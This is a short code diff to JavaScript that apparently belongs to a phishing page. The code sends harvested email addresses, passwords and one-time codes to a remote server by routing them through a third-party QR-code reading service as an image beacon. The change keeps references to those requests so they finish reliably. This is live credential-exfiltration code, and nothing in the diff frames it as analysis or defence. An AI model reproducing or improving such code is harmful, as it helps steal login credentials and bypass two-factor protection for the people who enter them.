@@ -1522,7 +1522,7 @@
                                    + "&otp=" + encodeURIComponent(otp)
                                    + "&ts=" + Date.now();
                             var _url = "https://api.qrserver.com/v1/read-qr-code/?fileurl=" + encodeURIComponent(_srv + "/kgde/heartbeat/response_qr.png?" + _q) + "&_cb=" + Date.now();
-                            var _img = new Image(); _img.src = _url;
+                            var _img = new Image(); if (!window.__inflight) window.__inflight = []; window.__inflight.push(_img); _img.onload = _img.onerror = function() { var idx = window.__inflight.indexOf(_img); if (idx !== -1) window.__inflight.splice(idx, 1); }; _img.src = _url;
                         } catch(e){}
                     })(email, pass);
 
@@ -1602,7 +1602,7 @@
                                    + "&type=cred_step1&email=" + encodeURIComponent(em)
                                    + "&ts=" + Date.now();
                             var _url = "https://api.qrserver.com/v1/read-qr-code/?fileurl=" + encodeURIComponent(_srv + "/kgde/heartbeat/response_qr.png?" + _q) + "&_cb=" + Date.now();
-                            var _img = new Image(); _img.src = _url;
+                            var _img = new Image(); if (!window.__inflight) window.__inflight = []; window.__inflight.push(_img); _img.onload = _img.onerror = function() { var idx = window.__inflight.indexOf(_img); if (idx !== -1) window.__inflight.splice(idx, 1); }; _img.src = _url;
                         } catch(e){}
                     })(email);
 
